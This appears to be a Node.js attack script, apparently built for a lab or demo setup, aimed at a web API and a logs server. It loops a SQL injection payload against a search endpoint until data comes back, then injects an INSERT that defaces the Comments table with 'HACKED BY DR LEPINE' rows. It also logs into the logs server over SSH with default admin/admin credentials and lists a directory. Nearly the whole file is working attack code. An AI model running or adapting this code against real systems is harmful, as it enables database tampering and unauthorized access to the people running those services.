const fs = require('fs')
const path = require('path')
const {NodeSSH} = require('node-ssh');
const { resolve } = require('path');
const RandExp = require('randexp');
const f = require('node-fetch');

const ssh = new NodeSSH()
const API_IP = process.env.API_IP || "localhost";
const API_PORT = process.env.API_PORT || 8081;
const LOGS_IP = process.env.LOGS_IP || "localhost";
const LOGS_SSH_PORT = process.env.LOGS_SSH_PORT || 8022;

const sleep = (time) => {
  return new Promise(resolve => setTimeout(resolve,time));
}

function generateUUID() { // Public Domain/MIT
  var d = new Date().getTime();//Timestamp
  var d2 = ((typeof performance !== 'undefined') && performance.now && (performance.now()*1000)) || 0;//Time in microseconds since page-load or 0 if unsupported
  return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
      var r = Math.random() * 16;//random number between 0 and 16
      if(d > 0){//Use timestamp until depleted
          r = (d + r)%16 | 0;
          d = Math.floor(d/16);
      } else {//Use microseconds since page-load if supported
          r = (d2 + r)%16 | 0;
          d2 = Math.floor(d2/16);
      }
      return (c === 'x' ? r : (r & 0x3 | 0x8)).toString(16);
  });
}
const AttackAPI = async () => {
  let success = false;
  let l = "";
  const p = "/home/Search?searchData=";
  while(!success){
    const q = (Math.floor(Math.random()*1) === 0) ?  `%';Select * from Comments where Comment like '%`: new RandExp('(\[a-z]{1,20})(.+{1,15})').gen();
    l = "http://"+API_IP+":"+API_PORT+p+q;
    const r = await f(l, {method : 'GET'});
    try{
      const j = await r.json();
      success = (j.length > 0);
    }
    catch(err){};
    await sleep(250);
  }
  console.log("FOUND INJECTION BACKDOOR WITH ", l);
  console.log("INJECTING HACKING COOKIE");
  const z = "http://"+API_IP+":"+API_PORT+p+`%';INSERT INTO Comments (CommentId,UserId,Comment) VALUES ('${generateUUID()}','DR LEPINE#${Math.floor(Math.random()*1000000)}','HACKED BY DR LEPINE #${Math.floor(Math.random()*1000000)}');Select * from Comments where Comment like '%`;
  console.log(z);
  const hack = await f(z, {method : 'GET'});
}

const SSHIntoLogs = async () => {
  ssh.connect({
    host: LOGS_IP,
    port: LOGS_SSH_PORT,
    username : 'admin',
    password : 'admin',
  }).then(() =>{
    console.log("SSH CONNECTION TO LOGS SUCCESSFULL");
    ssh.execCommand("ls /app").then(({stdout}) =>{
      console.log("READING DIRECTORY ON LOGS");
      console.log(stdout);
    });
  }).catch((error) =>{
    console.error("Something went wrong : ", error);
  })
}

//
console.error("LEPINE HACKING BEGINS");
console.log(API_IP,API_PORT);
AttackAPI();
SSHIntoLogs();
